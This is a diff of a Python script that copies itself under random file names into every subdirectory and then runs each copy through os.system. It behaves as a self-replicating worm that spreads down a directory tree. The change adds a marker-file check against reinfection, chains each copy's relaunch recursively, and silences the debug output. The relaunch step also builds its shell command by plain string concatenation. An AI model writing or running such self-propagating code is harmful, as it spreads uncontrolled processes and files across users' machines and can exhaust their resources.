@@ -22,32 +22,33 @@ def getSubdirectories(path):
     for item in directory_contents:
         if os.path.isdir(item):
             my_dir.append(item)
-    print("DEBUG: getSubdirectories:", my_dir)
+    #print("DEBUG: getSubdirectories:", my_dir)
     return my_dir
 
-def sprayToSubDir(actualpath,filename,dirList):
+def sprayToSubDir(actualpath,filename,dirList,mark):
     for dir in dirList:
         newFilename = getRandomString(8)+".py"
-        print("DEBUG: sprayToSubDir: copy of "+filename +" to '"+actualpath+"/"+dir+"/"+newFilename+"'")
-        copyFileToAnother(filename,actualpath+"/"+dir+"/"+newFilename)
+        if not isMarkHere(actualpath,dir,mark):
+            copyFileToAnother(filename,actualpath+"/"+dir+"/"+newFilename)
+            relaunch(actualpath,dir,newFilename)
 
-def relaunch(actualpath,dirList):
-    for dir in dirList:
-        os.system("python "+actualpath+"/"+dir+"/*.py")
-        print("DEBUG: relaunch: 'python "+actualpath+"/"+dir+"/*.py'")
+def relaunch(actualpath,dir,file):
+    os.system("cd "+actualpath+"/"+dir+"/ && "+"python "+file)
 
-
+def isMarkHere(actualpath,directory,mark):
+    return os.path.exists(actualpath+"/"+directory+"/"+mark)
+        
 def main(argv):
     if len(argv) != 1:
         print("usage: python {0}".format(argv[0]))
         sys.exit(1)
-    print("-------------------------------")
+
+    mark = "MARK"
     dirpath = os.getcwd()
-    print("DEBUG: main, actualpath='"+dirpath+"'")
+    print("---------------"+dirpath+"----------------")
+    #print("DEBUG: main, actualpath='"+dirpath+"'")
     subdirectories = getSubdirectories(dirpath)
-    sprayToSubDir(dirpath,argv[0],subdirectories)
-    relaunch(dirpath,subdirectories)
-    print("-------------------------------")
+    sprayToSubDir(dirpath,argv[0],subdirectories,mark)
 
 if __name__ == "__main__":
     main(sys.argv)
